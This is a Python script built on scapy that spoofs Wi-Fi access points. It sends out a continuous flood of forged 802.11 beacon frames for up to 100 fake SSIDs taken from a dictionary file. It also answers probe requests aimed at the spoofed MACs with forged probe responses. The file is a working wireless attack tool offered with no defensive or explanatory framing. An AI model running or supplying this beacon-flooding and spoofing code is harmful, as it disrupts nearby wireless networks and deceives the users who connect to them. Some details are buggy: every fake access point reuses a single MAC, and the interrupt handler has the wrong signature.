import logging
from signal import SIGINT, signal
from multiprocessing import Process
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeResp, RadioTap, Dot11, Dot11Elt, Dot11Beacon, Dot11ProbeReq

intfmon = 'wlan0'  # monitor interface
APs = 100  # number of AP to create
apdictionary = "ssid.txt"  # dictionary containing ssid names
verbose = 1  # debug level (0-2)
mac = RandMAC().upper()
maclist = []
ssidlist = []
ftime = int(time.time() * 1000000)


def uptime():
    microtime = int(round(time.time() * 1000000)) - ftime
    return microtime


def beacon_frame(ssidlist, maclist, intfmon):
    while True:
        for n in range(len(ssidlist)):
            sendp(RadioTap() /
                  Dot11(addr1="ff:ff:ff:ff:ff:ff",
                        addr2=maclist[n],
                        addr3=maclist[n]) /
                  Dot11Beacon(cap="ESS+privacy", timestamp=uptime()) /
                  Dot11Elt(ID="SSID", info=ssidlist[n]) /
                  Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16') /
                  Dot11Elt(ID="DSset", info="\x03") /
                  Dot11Elt(ID="TIM", info="\x00\x01\x00\x00"),
                  iface=intfmon, loop=0, verbose=False)
            print(f'Sending beacon for SSID: {ssidlist[n]} with MAC {maclist[n]}')
        time.sleep(.102)


def load_vendor(num_of_aps):
    # Generate some mac addresses and shove them in a list
    for n in range(num_of_aps):
        maclist.append(mac)


def load_ssid(num_of_aps):
    # Grab some random SSIDs from the wigle list and shove in a list
    for n in range(num_of_aps):
        ssidlist.append(generate_ssid())


def generate_ssid():
    try:
        ssidlist = random.choice(open(apdictionary).readlines())
    except IOError as ioer:
        print(f'Could not open ssid.txt. Does the file exist? '
              f'Do you have the correct permissions? {ioer.errno}: {ioer.strerror}')
    return ssidlist.replace("\n", "")


def probe_response(ssid, mac, rates, stamac, intfmon):
    sendp(RadioTap() /
          Dot11(addr2=mac, addr3=mac, addr1=stamac) /
          Dot11ProbeResp(beacon_interval=102, cap='0x2104', timestamp=uptime()) /
          Dot11Elt(info=ssid, ID=0) /
          Dot11Elt(info=rates, ID=1) /
          Dot11Elt(info='\x01', ID=3, len=1) /
          Dot11Elt(info='\x00', ID=42, len=1) /
          Dot11Elt(info='\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x02\x00\x0f'
                        '\xac\x04\x01\x00\x00\x0f\xac\x02(\x00', ID=48, len=24),
          iface=intfmon, loop=0, verbose=False)


def sig_int():
    print("Shutting down....")
    sys.exit(0)


# Main loop
signal(SIGINT, sig_int)

# load all of our MACs and SSIDs to spam
load_vendor(APs)
load_ssid(APs)

# Fork out the beacon frames
Process(target=beacon_frame, args=(ssidlist, maclist, intfmon,)).start()

# Start sniffing for probe request from our previously forked out beacon frames,
# and grab the ssid, rates, and MAC they are referencing
while True:
    ssid = None
    rates = None
    mac = None
    # start sniffing
    p = sniff(iface=intfmon, count=1)[0]
    # If the sniffed packet is a probe request and is sending
    # it to one of our MAC addresses
    if p.haslayer(Dot11ProbeReq) and p.addr1 in maclist:
        pkt = p.getlayer(Dot11Elt)
        mac = p.addr1

        # Start Core Security's code
        while pkt:
            if pkt.ID == 0:
                # ID 0's info portion of an 802.11 packet is the SSID, grab it
                ssid = pkt.info.decode()
            if pkt.ID == 1:
                # ID 1's info portion of a 802.11 packet is the supported rates
                rates = pkt.info
            pkt = pkt.payload
        probe_response(ssid, mac, rates, p.addr2, intfmon)
